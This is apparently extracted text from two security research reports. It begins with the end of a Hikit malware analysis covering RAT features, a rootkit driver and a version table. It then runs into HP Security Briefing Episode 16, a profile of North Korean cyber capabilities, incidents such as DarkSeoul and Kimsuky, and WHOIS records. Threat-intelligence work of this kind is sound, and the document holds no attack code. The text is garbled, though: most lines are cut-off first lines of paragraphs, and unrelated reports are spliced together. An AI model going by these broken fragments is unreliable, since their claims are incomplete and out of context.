Arguments string                                  Purpose
Driver to reveal the service .
Driver to hide the service .
If the i
The DLL ’s RAT functionality provides basic features such as network port forwarding ( proxying ) , file
The communication between the Gen 2 malware and the C2 ( or other Gen 2 malware , in the case of
Each DLL includes a hardcoded , default configuration . At the time that the RAT functionality activates ,
In order to provide some level of stealth , the RAT will install a rootkit on 32-bit versions of Windows .
The DLL contains a device driver image embedded within an encoded buffer which the RAT
Support Software
In addition to the main Hikit malware , there are at least two examples of support programs that belong
Detection
Detecting Hikit variants on disk and in memory is possible using the following YARA signature
Detecting nominal Gen 1.2 and later network activity is problematic given the nature of the
From a system objects perspective , Gen 2 samples produce up to three named events . The event
Appendix A : HiKit Versions
Generation    Starting Date       Notable Features
Identifier
Gen 1.0       31 March 2011       First known Hikit samples . Stand - alone console executable .
Gen 1.1       18 April 2011       Uses DLL and driver model .
Gen 2.0       28 August 2011      First client - based Hikit variants . Stand - alone console
Alpha                            executable . Does not use a device driver . Encrypted
Gen 1.2       23 October 2011     Command “ socks5 ” changes to “ proxy ” . Encrypted
Gen 2.0       27 February 2012    Introduces the use of the device driver .
Beta
Gen 2.1       17 April , 2012      First known production variant of the Gen 2 family . Uses the
Gen 2.2       21 February 2013    Changes storage location for configuration file . Largely similar
Gen 2.3       12 December         Significantly more advanced authentication when doing intra-
Companion report
Episode 16 , August 2014
Profiling an enigma : The
Table of Contents
Introduction .................................................................................................................................................... 3
Research roadblocks ...................................................................................................................................... 4
Ideological and political context .................................................................................................................... 5
Juche and Songun ...................................................................................................................................... 5
Tension and change on the Korean Peninsula .......................................................................................... 8
North Korean cyber capabilities and limitations ......................................................................................... 10
North Korean infrastructure .................................................................................................................... 10
An analysis of developments in North Korean cyberspace since 2010 .................................................. 14
North Korean cyber war and intelligence structure ................................................................................ 21
North Korean cyber and intelligence organizational chart ..................................................................... 26
North Korea ’s cyber doctrine , strategies and goals ............................................................................... 26
Cyber warfare operations ........................................................................................................................ 27
Gaming for profit and pwnage ................................................................................................................ 29
Intelligence and counterintelligence ...................................................................................................... 29
Psychological operations ........................................................................................................................ 32
Electronic warfare ................................................................................................................................... 38
Training cyber warriors ........................................................................................................................... 39
Important political and military ties ............................................................................................................ 42
China ........................................................................................................................................................ 42
Russia ...................................................................................................................................................... 43
Iran ........................................................................................................................................................... 43
Syria ......................................................................................................................................................... 44
Cuba ......................................................................................................................................................... 44
Timeline of significant North Korean cyber activity .................................................................................... 45
Patterns in the noise : cyber incidents attributed to North Korean actors .................................................. 47
Kimsukyang ............................................................................................................................................. 57
New Romantic Cyber Army Team / Hastati ............................................................................................. 57
Malware summary ........................................................................................................................................ 58
Analysis ........................................................................................................................................................ 60
Summary ...................................................................................................................................................... 61
Appendix A – WHOIS records ........................................................................................................................ 64
Appendix B – Sites found on North Korean IP space .................................................................................... 72
Appendix C – Analysis of DarkSeoul Dropper .............................................................................................. 74
Learn more at .......................................................................................................................................... 75
Episode 16
Thank you for subscribing to Episode 16 of the HP Security Briefing . In this
Republic of Korea .
Introduction
The Democratic People ’s Republic of Korea ( DPRK ) , known in the West as North Korea , is a unique
North Korea was formerly on the U.S. list of state sponsors of terrorism , it was removed in 2008 . 1
However , due to North Korea ’s hostility toward other nations , its pursuit of nuclear weapons , and
Korea ( ROK ) , known in the West as South Korea , North Korea ’s primary target of conflict.6
Due to North Korea ’s global interactions , its cyber warfare capabilities are of particular interest to
Korea , North Korean hackers have successfully penetrated U.S. defense networks more
Committee , General Curtis M. Scaparrotti noted that “ North Korea remains a significant threat to
United States’ interests , the security of South Korea , and the international community due to its
Korea ’s asymmetric arsenal includes … an active cyber warfare capability.”9 While one would expect
While the U.S. views North Korea ’s cyber warfare program as the regime ’s foray into modern
Korea ’s premier hacking unit , Unit 121 , trails Russia and the U.S. as the world ’s third largest cyber
Korea ’s hacker forces at around 3000 personnel . In a July 2014 report from South Korea ’s Yonhap
News Agency , that figure was upgraded to 5900 hacker elite.13 We must stress that although
Obtaining details on North Korea ’s cyber warfare capabilities is not an easy task . This paper will
Research roadblocks
The following conditions proved to be research roadblocks when gathering intelligence regarding
North Korea ’s cyber warfare capabilities :
Ideological and political context
In order for Westerners to understand the North Korean mindset , it is necessary to examine the
Juche and Songun
North Korea has two primary ideologies that provide context for the regime ’s motivations and
Korea . It was instituted in 1972 and is based on the ideologies of Kim Il - Sung , the founder of the
North Korea ’s disdain for outside cultural and political influence . Juche challenges North Koreans
The regime ’s greatest fear is internal dissent and resulting destabilization.19 20 In a June 2014
Reddit AMA session , Dr. Andrei Lankov , an expert on North Korean culture and society , noted
Songun is North Korea ’s “ military first ” doctrine . Songun emphasizes the priority of the military in
U.S .- South Korean alliance."25                                                             Songun is North Korea ’s
North Korea ’s songun permeates the lives of all North Korean citizens . Article 58 of                                            Songun emphasizes the
Some North Korean youth aged 7 - 13 are inducted into the Korean Children ’s Union . The Korean
Children ’s Union is responsible for indoctrinating youths who pledge to build up their strength to
Figure 1 A group of North Korean children being inducted into the Korean Children ’s Union.29
Figure 2 Members of the Korean Children ’s Union with the regime ’s leader Kim Jong Un.30
Children aged 14 - 16 can begin military training as members of the Young Red Guards , a
Training Unit.31 The Reserve Military Training Unit forms the core of North Korea ’s reserves and is
The regime has an impressive number of conventional weapons , considering the nation ’s small
The regime ’s sea weaponry includes 70 submarines , 420 patrol combatants , and 260 amphibious
Tension and change on the Korean Peninsula
Tension between North and South Korea has continued well past the armistice meant to end the
Korean War . Neither nation recognizes the other as a legitimate state . South Korea ’s constitution
In recent years , two primary factors have heavily influenced the current state of North Korea ’s
April 2012 , following the death of his father Kim Jong Il in December 2011 . While his age
Korea . First , Kim Jong Un ’s personal life is more public and more extravagant than that of his
Kim also executed his own uncle , a high - ranking official who did not share his ideals . These moves
Human Rights Watch , “ The government now recognizes that the accounts of escaping North
Koreans reveal Pyongyang ’s crimes – so it is doing what it can to stop people from fleeing.”48
Under Kim Jong Un ’s rule , the regime has stepped up its nuclear materials production , and the
The regime ’s response to perceived threats has also become more volatile . Christian Whiton , a
Ellen Kim , assistant director of the Korea Chair at the Center for Strategic and International
Studies , assessed the situation thusly : “ Since [ Kim Jong Un ] took power he has purged almost all
Interview ” follows two talk show hosts who are asked to assassinate Kim Jong Un . The regime
While tensions between North and South Korea have persisted since the Korean War , these
Hye . Her platform , in her words , is as follows : “ North Korea must keep its agreements made with
South Korea and the international community to establish a minimum level of trust , and second
North Korea denounced UN Security Council Resolution 2094 , which is “ a resolution strengthening
Korea by targeting the illicit activities of diplomatic personnel , transfers of bulk cash , and the
March 2013 , as is noted later in this paper.55
North Korean cyber capabilities and limitations
North Korean infrastructure
North Korea ’s cyber infrastructure is divided into two major parts : an outward - facing Internet
Jean H. Lee , the Associated Press bureau chief in Pyongyang , stated that foreigners visiting North
Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the
Kwangmyong ( gwang me - young ) , a nationwide intranet with no access to the world outside North
Korea . 57 According to Lee , Kwangmyong allows citizens “ access to the state media , information
Internet from this location is unknown .
Star Joint Venture Co. is responsible for providing North Korea ’s Internet access . Star Joint Venture
Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley
Pacific in Thailand.61 In December 2009 , Star Joint Venture became responsible for North Korea ’s
Internet address allocation . Previously , Internet access was provided by a German satellite link via
Korea Computer Center Europe or via direct connections with China Netcom , which was later
Korea ’s backup Internet connection , in case the China Unicom connection fails.66 A March 2013
Korea . While his analysis of The Pirate Bay ’s hosting is irrelevant to our research , he did detail that
Korea ’s Star Joint Venture Company , and AS4837 is China Unicom . The author concluded that “ all
North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial
Zone , a jointly operated industrial complex just north of the border . However , this would likely
North Korea ’s electrical grid can not support a large technological infrastructure.69 Electrical
Figure 3 North and South Korean power grid
The photo above ( Figure 3 ) , from the International Space Station , shows North Korea ’s sparse
Koryolink , the country ’s only cellular phone network,72 is tightly controlled by the regime.73 Cell
Internet and can only make domestic calls.74 According to a 2013 report , North Korea has a 3 G
Email is also regulated by the regime . The first email provider in North Korea was Silibank . Silibank
Silibank homepage is silibank.net , and the Chinese homepage is silibank.com . In order to use the
Korea Computer Center ( KCC ) is North Korea ’s leading government research center for
United Arab Emirates . KCC has a vested interest in Linux research and is responsible for the
North Korea ’s proprietary operating system is Red Star OS . The development of this Linux - based
Korean , English , Russian , Chinese , and Japanese . Regime ideals extend to Red Star OS . The
Red Star OS . However , the purchase of computers is heavily regulated.84 The OS ’s design suggests
North Korea is known to use two IP ranges . 175.45.176.0/22 is North Korea ’s own IP block.86
Additionally , North Korea ’s Telecommunications Ministry is the registered user of China Unicom IP
North Korea ’s country code top - level domain ( ccTLD ) is .kp . In 2007 , the .kp TLD was initially
Nameserver              IP Address
Various U.S. , U.N , and other sanctions prohibit export of dual - use technologies to North Korea . In
This is ironic since foreign - made electronic components are sometimes smuggled into North
Korea for military use and for personal use by the regime ’s upper echelon .
An analysis of developments in North Korean cyberspace since 2010
A comparison of a scan97 of North Korea ’s IP ranges in November 2010 , just one month after
North Korea made its first direct connection to the Internet , and a series of several scans we
Internet presence .
In the November 2010 scan , 175.45.176.0 - 175.45.176.16 showed a variety of devices including
D - link , Cisco , Linksys , HP , and Nokia devices , and a Juniper networks firewall . Operating systems
In 2014 , several webservers and nameservers were found in the 175.45.178.xx range , and
Domains , nameservers , and mail servers present during the May 2014 scan are listed in Appendix
B at the end of this report .
According to Alexa rankings , the three most visited websites in North Korea are kcna.kp , the
Korean news site101 ; and naenara.com.kp , North Korea ’s official web portal.102 Naenara translates
The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star
Joint Venture Company . The WHOIS Record can be found in Appendix A.
Figure 4 A screenshot from the kcna.kp homepage.103
Figure 5 A screenshot from the rodong.rep.kp homepage.104
The WHOIS information for Naenara.com.kp was not available .
Figure 6 A screenshot of the Naenara.com.kp website.105
In March 2013 , there were reports that the Chrome browser was blocking Naenara.com.kp due to
Figure 7 Screenshot of what visitors to Naenara.com.kp saw when using the Chrome browser.107
Figure 8 Screenshot detailing why Chrome blocked the site108
It is difficult to say whether this incident is a case of North Korea serving malware or whether a
Several major North Korean websites are hosted outside of North Korea . The popular
Figure 9 A screenshot of the Uriminzokkiri website 109
The website for Kim Il Sung Open University , otherwise known as “ Our Nation School ” is also
Figure 10 A screenshot of ournation-school.com . 110
North Korean cyber war and intelligence structure
At the top of North Korea ’s military structure is the National Defense Commission ( NDC ) . The NDC
North Korea ’s political hierarchy.112 Article 106 of North Korea ’s Constitution gives the NDC the
The NDC oversees several defense and intelligence bodies including the Ministry of State Security ,
Army . The Ministry of State Security ( MSS ) , also known as the State Security Department , is North
Korea ’s primary counterintelligence service . It is considered an autonomous agent of the regime
Public Security ( MPS ) . Focused on domestic order , it oversees North Korea ’s national police force ,
The Ministry of People ’s Armed Forces ( MPAF ) administrates the Korean People ’s Army ( KPA ) and
Staff Department also oversees the Reconnaissance General Bureau ( RGB ) , North       an attack component . One of
Unit 121 ’s command posts is
Korea ’s agency for clandestine operations . The RGB has a role in both traditional
Chilbosan Hotel in Shenyang ,
Pyongyang.120 Unit 121 comprises both an intelligence component and an attack component . Unit
Chilbosan Hotel122 in Shenyang , the capital of Liaoning Province , which borders North Korea.123
Shenyang is a Chinese military district.124 According to Dr. Alexandre Mansourov , an expert on
North Korea and a visiting scholar at the U.S .- Korea Institute at Johns Hopkins University , " They
Figure 11 A map pinpointing the location of the Chilbosan Hotel.128
Clarke , R. A. ( 2012 ) . Cyber war : The next threat to national security and what to do about it . New York , NY : Ecco .
Figure 12 A satellite view of the Chilbosan Hotel.129
Several entities are nested under the Workers’ Party . The Central Party
Committee oversees the Central Party Investigative Group , also known as Unit           The Unification Bureau falls
Operations Department is
Psychological Operations Department of the North Korea Defense Commission
It plays a more traditional intelligence and psychological operations role , rather     Department of the North Korea
Defense Commission also
Examples of this activity include the Korean Asia - Pacific Committee and the
Ethnic Reconciliation Council . The UFD also manages inter - Korean dialogue and North Korea ’s
Clarke , R. A. ( 2012 ) . Cyber war : The next threat to national security and what to do about it . New York , NY : Ecco .
The Liaison Department of the Worker ’s Party oversees a faction of ethnic North Koreans residing
Agency ( PSIA ) , “ Chongryon is virtually under the direct control of the Liaison Department of the
Workers’ Party of Korea , which has been in charge of North Korea ’s covert operations and
North Korea ’s covert
The regime also has several government bodies under the Cabinet142 that oversee              against South Korea . ”
Central Scientific and Technological Information Agency ( CSTIA ) , the Ministry of Electronics
Industry , and the Ministry of Posts and Telecommunications . The CSTIA collects , analyzes , and
North Korean cyber and intelligence organizational chart
Figure 13 North Korean cyber and intelligence organizational chart
North Korea ’s cyber doctrine , strategies and goals
North Korea ’s cyber warfare doctrine has not been clearly stated . However , based on cultural and
Although North Korea ’s limited online presence makes a thorough analysis of their cyber warfare
According to the aforementioned report to the House Armed Service Committee , “ Cyber warfare is
The report by Capt . Duk - Ki Kim , Ph.D. highlighted North Korea ’s counter - asymmetric strategy and
Figure 14 Threat matrix of North Korean asymmetric war capabilities.154
Cyber warfare operations
Just ten years ago , experts noted that North Korea was one of the “ least network - ready and most
Counterintelligence Executive assessed that “ Development of the nation , rather than
According to Kim Heung - kwang , a North Korean defector and former computer science professor ,
North Korea ’s attack and defense capabilities reportedly include the following cyber warfare and
State Department originating in the East Asia - Pacific region coincided with U.S .- North Korea
Departments . North Korea also tested a logic bomb in October 2007 . A logic bomb is malicious
North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of
Gaming for profit and pwnage
North Korea has reportedly used computer games for both illegal capital gain and
North Korea has used
According to South Korean reports , the culprits used an auto - player to quickly
Intelligence and counterintelligence
North Korea ’s intelligence program is one of its strongest military assets , providing foundational
Historically , the primary goals of the regime ’s intelligence program included collection and
North Korea has a broad reach for intelligence collection , which extends to cyber intelligence.173
In April 2013 , Solutionary , a company providing managed security services , reported a marked
North Korean IPs . Solutionary refers to any overt external attacks on company                A faction of ethnic North
Koreans residing in Japan ,
As mentioned above , a faction of ethnic North Koreans residing in Japan , known as the Chongryon ,
Figure 15 Headquarters of the Chongryon.176
It was then purchased by a monk named Ekan Ikeguchi , who let the Chongryon continue to use
Japanese government . He also has ties to the political group Nihon Seinensya , which is involved in
The Chongryon operate at least two websites , chongryon.com , which is in Japanese , and korea-
Appendix A.
Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit
North Korea has a global network of state - run businesses located in 30 to 40                                                   North Korea has a global
Members of this espionage network reportedly “ send more than $ 100 million in
The regime is also known to kidnap foreign citizens and use them as instruments
North Korea has also infiltrated important positions in South Korea for both intelligence and
Service reportedly discovered the presence of Communist spies . These spies within their trusted
These intelligence collection and counterintelligence capabilities are an attempt to provide the
Psychological operations
North Korea continues to be a master of propaganda and deception and leverages the cyber
Lankov , the North Korean government has “ very rational and highly successful manipulators who
The regime ’s Unit 204 is responsible for cyber - psychological operations . These
North Korean citizens have access to state - approved social networks on the Kwangmyong.193
Figure 16 A photo posted by Jean Lee on Instagram shows one of the social networking sites on
The regime has a limited overt social media presence on the Internet . Some of the known social
It is unclear whether this channel is officially sanctioned.195 The North Korea Today YouTube
Figure 17 A screenshot of the North Korea Today YouTube Channel.198
The Uriminzokkiri website , known for pushing juche ideology and anti - American and anti - South
Korean messages , has accompanying social media profiles on YouTube,199 Google+,200 and
Facebook.201 It also has Twitter profiles in both Korean202 and English.203
Figure 18 A screenshot of the Uriminzokkiri YouTube channel.204
Figure 19 A screenshot from the Uriminzokkiri Facebook page shows anti - U.S. and pro - juche
Figure 20 A screenshot of the Uriminzokkiri Korean language Twitter profile.206
Figure 21 A screenshot of the Uriminzokkiri English language Twitter profile.207
North Korean propaganda208 is used for several purposes : to enforce the ideals of allies        In the spirit of juche ,
North Korea ensures its citizens are not exposed to outside information that is counterproductive
Jong Il ’s death in 2011 , North Korean media altered photos of their “ Dear Leader ” to make him
According to Dr. Andrei Lankov , “ North Koreans now have a much better understanding of what is
North Korea even uses “ trolling ” as a PSYOP tactic . On the Internet , “ trolls ” are users who post
National Security Project , said , " North Korea 's cyber - development is almost just a new
Leveraging the cyber and intelligence resources noted above , North Korea ’s psychological
North Korea for the attacks , or the regime simply takes credit for an attack that has not yet been
Electronic warfare
North Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS
Korea ’s GPS signals during a joint U.S .- South Korea military exercise.219 North Korea has the
U.S. Department of Homeland Security ( DHS ) noted North Korea ’s ability to deliver a nuclear
Korea reportedly acquired its EMP technology from Russia.223
North Korea also has a drone program . The regime reportedly acquired its first drones in the late
Aviation Technology , the company denied involvement.226
Figure 22 A drone attributed to North Korea . 227
Stressing the importance of the regime ’s electronic warfare capabilities , in 1999 former regime
Training cyber warriors
North Korea utilizes primary and secondary education and the university system to train its cyber
Korean animation stresses the importance of mathematics in North Korean education . The short
Figure 23 A screenshot from the North Korean animation depicting geometry as a necessary skill
Science and technology students are expected to learn foreign languages , which may include
Chinese , Japanese , and English.233 Student emails , chats , and web browsing activities are heavily
Figure 24 North Korean students training for cyber war.235
The successful students are then sent to Kim Il - sung University , Kim Chaek University of
Technology,236 or the Command Automation University , traditionally known as Mirim University .
Kim Il - sung University ’s computer center was started in 1985 . Its computer courses have a heavy
Kim Chaek University of Technology was established in 1948 . In the late 1990s , it began to
The Command Automation University periodically chooses around 100 students for an intensive
The elite cyber operators are given special incentives . For example , parents of students
Pyongyang ; and married cyber operators are given housing , a food allowance , and a stipend if
North Koreans allowed to access the outside Internet.244
Important political and military ties
While this report focuses on North Korea ’s cyber warfare capabilities , these capabilities can not be
China
North Korea has a longstanding historical relationship with China . During the Korean War ( 1950-
Korea is economically dependent on China . North Korea gets an estimated 90 percent of its
This relationship is prudent – in the event of a military conflict , China can strategically use North
Korea as a buffer zone between itself and South Korea , where many U.S. military personnel are
North Korea relies heavily on China for technological resources . As noted above , North Korea
North Korea also relies on China to provide much of its network hardware , including servers and
Russia
North Korea has a long history of ties to Russia . The former Soviet Union was the major sponsor
Union , aid to North Korea was halted and trade diminished significantly . This chain of events
North Korea currently has a collaborative relationship with Russia in the cyber realm . The regime ’s
Political ties between Russia and North Korea have become stronger in recent months . In 2014 ,
National Graduate Institute for Policy Studies , stated “ By strengthening its relationship with North
Korea , Russia is trying to enhance its bargaining position vis - à - vis the United States and Japan.”256
Russia also recently forgave most of the regime ’s debts.257
Iran
North Korea and Iran have longstanding political and military ties . North Korea supplied Iran with
Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after
North Korea also has cyberwar ties with Iran . In 2012 , North Korea and Iran signed a technology
F - Secure ’s Mikko Hypponen stated , " It 's highly likely that one of the reasons for this co - operation
Hypponen cited Flame malware as a possible triggering event for the creation of this treaty .
Others also suspect that Iran and North Korea ’s mutual interest in development of nuclear
Additionally , North Korea , in conjunction with Iran and Syria , reportedly supports both Hamas and
Hezbollah in procuring kinetic weaponry and communications equipment and in establishing
Syria
North Korea has both a cyber relationship and kinetic weapons ties with Syria . KCC reportedly has
In 2007 , Israel launched an airstrike , destroying a Syrian target that was allegedly a nuclear facility
The North Korea - Syria relationship becomes more important in the context of both countries’ ties
Hamas and Hezbollah.269 270 271 Additionally , as we explored in HPSR Security Briefing Episode 11 ,
Iran and Syria ’s military alliances extend to joint SIGINT and cyber operations.272
Cuba
North Korea also has an interesting relationship with Cuba – one that includes supplying weapons
Affairs stated that the cargo included " 240 metric tons of obsolete defensive weapons -- two anti-
Cuba.273 Following the incident , Fidel Castro credited former North Korean leader Kim Il - Sung for
While no apparent cyber relationship exists between North Korea and Cuba at this time , their track
Timeline of significant North Korean cyber activity
Day . ( July)280 281
Patterns in the noise : cyber incidents attributed to North Korean actors
It is interesting to note that much of North Korea ’s cyber activity follows a distinct pattern .
Analysis of North Korean cyber activity gives insight into these patterns and also helps tie
In 2004 , in response to the annual U.S. – South Korea joint military exercises , North Korea
Department was attacked by entities in the East Asia - Pacific region . The attacks coincided with
State Department negotiations with North Korea regarding the regime ’s nuclear missile tests . 307
In July 2006 , North Korea ’s Unit 121 reportedly breached South Korean and U.S. military
International Atomic Energy Agency ( IAEA ) ordered the shutdown of the regime ’s nuclear facilities
In April 2009 , North Korea ejected IAEA and U.S. nuclear compliance officials . The regime indicated
Korea issued a statement via KCNA calling South Korea ’s involvement in PSI an act of war.312 In
June 2009 , North Korea stated that it was “ fully ready for any form of high - tech war.”313 The
Korean and U.S. government entities , media outlets , and financial websites . The attacks coincided
Operation Troy would continue for several years , largely undetected.316
In early 2011 , political and military tensions were high . In February , James Clapper , United States
Director of National Intelligence , testified that North Korea likely had undeclared uranium
In 2012 , an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean
The week of March 11 , 2013 , the U.S. and South Korea began their annual joint military exercise
Koreas . North Korea ’s foreign ministry also issued a statement that it perceived this exercise as a
On March 18 , the Uriminzokkiri YouTube channel posted an anti - U.S. video entitled “ Firestorms
Will Rain on the Headquarters of War ” that showed a depiction of the White House in crosshairs ,
Figure 25 Uriminzokkiri YouTube video portraying anti - U.S. sentiments . 327
In May 2013 , DarkSeoul malware was used to attack several South Korean financial institutions ;
As evidenced above , much of North Korea ’s cyber activity coincides with the annual U.S. – South
Korea joint military exercises . Attacks not following that pattern were typically in response to
Korea employ limited tactics , and their operational capability demonstrates an increase in the
In June 2014 , the regime demanded cancellation of the annual U.S. - South Korea joint military
The most prominent North Korean threat actor group is the group responsible for the DarkSeoul
According to statements
Some of the DarkSeoul attacks corresponded with significant dates , such as U.S. Independence
Day or the anniversary of the start of the Korean War . DarkSeoul attacks go beyond denial of
Rain ” DDoS attacks on U.S. and South Korean sites have also been attributed to the actors
A March 20 , 2013 attack attributed to the DarkSeoul actors targeted three South Korean media
Linux and Windows machines.341 McAfee found that these attacks were the culmination of the
A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber
Korea ’s Korea Internet and Security Agency , the North Korean IP address 175.45.178.xx was
Chinese email address . Additionally , researchers at AhnLab in South Korea noted a Chinese IP
While no concrete evidence has been released that indicates Lab 110 was responsible for the
Known tactics , techniques and procedures
Targets
South Korea . A defacement on the LG + U webpage stated that it was “ Hacked by WhoIs Team ”
Figure 26 A defacement by “ WhoIs Team ” 355
Known tactics , techniques , and procedures
Targets
Associated actors
Based on North Korea ’s affinity for disinformation and counterintelligence , we must note the
South Korean white hat capture the flag ( CTF ) team , whose members also operate under the
Figure 27 A screenshot showing that South Korea ’s RAON_ASRT white hat CTF team also uses the
Korean newspaper JoongAng Ilbo . The attack included an attempt to wipe JoongAng Ilbo ’s servers
Figure 28 Defacement by “ IsOne ” . 366
Although the groups have a similar name and both use a cat theme , it is unclear whether a CTF
Figure 29 A screenshot of “ The Cat is Number One ” profile on CTF Time 368
According to South Korea ’s National Police Agency , the attack on JoongAng Ilbo shares
Company , which is affiliated with North Korea ’s Ministry of Posts and Telecommunications .
Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in
Known tactics , techniques and procedures
Targets
Kimsukyang
The Kimsuky malware , which targeted South Korean think tanks , is loosely attributed to an actor
However , the following email addresses are associated with the Kimsuky operation:370
The email address iop110112@hotmail.com was registered using the alias “ kimsukyang ” , and
Kaspersky found that the Kimsuky operation used 10 IP addresses in two Chinese provinces that
Known tactics , techniques and procedures
Targets
New Romantic Cyber Army Team / Hastati
The New Romantic Cyber Army Team also took credit for the March 20 , 2013 attacks . McAfee
March 20 , 2013 attacks due to the group ’s “ frequent use of Roman and classical terms in their
It is interesting to note that the malware associated with these actors uses the strings “ HASTATI ”
Figure 30 Defacement by Hastati.376
Known tactics , techniques and procedures
Targets
Malware summary
Appendix C. Analysis of additional malware used in these campaigns produced no new findings
The majority of the malware used in cyber incidents attributed to North Korea were variations of
Dropper samples consistently targeted AhnLab Policy Center as a propagation method . This
Yang.380 CrowdStrike ’s report also briefly noted the use of an update server vector.381 Yang
Center . To test its payload , Yang set up a server / client and executed the update through the
According to CrowdStrike , the wiper malware was dropped on the systems as AgentBase.exe . The
Depending on the OS used , the wiper recursively deleted files on the file system , deleting the
Windows folder last . It then overwrote the MBR with the strings " HASTATI " , " PRINCPES " ,
While there are several variants of the wiper , all seem to have been used on the same date . It is
According to CrowdStrike , a third malware component downloaded an IRC RAT from various
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
Analysis
Based on the information above , we have identified strategic challenges that impact the
Korea and the U.S. , in order to launch cyber attacks.391 North Korea will likely be forced to
It is unlikely that North Korea will compromise on its nuclear program , meaning sanctions
Cyber incidents attributed to North Korean actors seem to follow distinct patterns :
North Korean cyber actors show continuity and consistency over time .
Korean joint military exercises , while the others fell on a significant date or were in
Summary
Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the
U.S. and its allies ? While North Korea ’s cyber warfare capabilities pale in comparison to those of
Korea.400 401
As shown by North Korea 's past behavior ( which is consistent with their doctrine ) , they are easily
The regime fears losing its control and the nation ’s culture to the ever - growing threat of outside
North Korean cyber operations are not generally observed originating from home field IP address
Given that North Korea has capable and technically trained forces and will demonstrate their
Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up
Known DPRK targets have been limited primarily to South Korean and U.S. organizations and
Appendix A – WHOIS records
Domain Name : silibank.net
Registry Domain ID :
Registrar WHOIS Server : whois.discount-domain.com
Registrar URL : http://www.onamae.com
Updated Date : 2014 - 03 - 11 17:27:55.0
Creation Date : 2006 - 03 - 13 13:14:53.0
Registrar Registration Expiration Date : 2015 - 03 - 13 03:14:53.0
Registrar : GMO INTERNET , INC .
Registrar IANA ID : 49
Registrar Abuse Contact Email : abuse@gmo.jp
Registrar Abuse Contact Phone :
Domain Status : ACTIVE
Registry Registrant ID :
Registrant Name : Whois Privacy Protection Service by MuuMuuDomain
Registrant Organization : Whois Privacy Protection Service by MuuMuuDomain
Registrant Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Registrant Street2 : Tenjin Prime 8F
Registrant City : Fukuoka - shi
Registrant State / Province : Fukuoka
Registrant Postal Code : 810 - 0001
Registrant Country : JP
Registrant Phone : 81 - 927137999
Registrant Phone Ext :
Registrant Fax : 81 - 927137944
Registrant Fax Ext :
Registrant Email : privacy@whoisprivacyprotection.info
Registry Admin ID :
Admin Name : Whois Privacy Protection Service by MuuMuuDomain
Admin Organization : Whois Privacy Protection Service by MuuMuuDomain
Admin Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Admin Street2 : Tenjin Prime 8F
Admin City : Fukuoka - shi
Admin State / Province : Fukuoka
Admin Postal Code : 810 - 0001
Admin Country : JP
Admin Phone : 81 - 927137999
Admin Phone Ext :
Admin Fax : 81 - 927137944
Admin Fax Ext :
Admin Email : privacy@whoisprivacyprotection.info
Registry Tech ID :
Tech Name : Whois Privacy Protection Service by MuuMuuDomain
Tech Organization : Whois Privacy Protection Service by MuuMuuDomain
Tech Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Tech Street2 : Tenjin Prime 8F
Tech City : Fukuoka - shi
Tech State / Province : Fukuoka
Tech Postal Code : 810 - 0001
Tech Country : JP
Tech Phone : 81 - 927137999
Tech Phone Ext :
Tech Fax : 81 - 927137944
Tech Fax Ext :
Tech Email : privacy@whoisprivacyprotection.info
Name Server : ns1.dns.ne.jp
Name Server : ns2.dns.ne.jp
Domain Name : uriminzokkiri.com
Creation Date : 2003 - 02 - 09 00:00:00
Updated Date : 2012 - 06 - 28 13:22:18
Expiration Date : 2015 - 02 - 09 00:00:00
Registrant :
Organization : chaoxianLiuYiYuBianJishe ShenYang Ban SHICHU
Name : Korea 615 Shenyang company
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Administrative Contact :
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
Technical Contact : Name : kim sejun
￼Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
Billing Contact :
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
Domain Name : ournation-school.com
Registry Domain ID :
Registrar WHOIS Server : whois.paycenter.com.cn
Registrar URL : http://www.xinnet.com
Updated Date:2012 - 06 - 28 13:22:20
Creation Date:2004 - 10 - 29 00:00:00
Registrar Registration Expiration Date:2014 - 10 - 29 00:00:00
Registrar : XINNET TECHNOLOGY CORPORATION
Registrar IANA ID:120
Registrar Abuse Contact Email : supervision@xinnet.com
Registrar Abuse Contact Phone:+86.1087128064
Domain Status :
Registry Registrant ID :
Registrant Name : Korea 615 Shenyang company
Registrant Organization : chaoxian liuyiyubianjishe shenyangbanshichu
Registrant Street : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
Registrant City : shenyangshi
Registrant State / Province : liaoningsheng
Registrant Postal Code:123456
Registrant Country : China
Registrant Phone:+86.024 22523102
Registrant Phone Ext :
Registrant Fax:+86.024 22523102
Registrant Fax Ext :
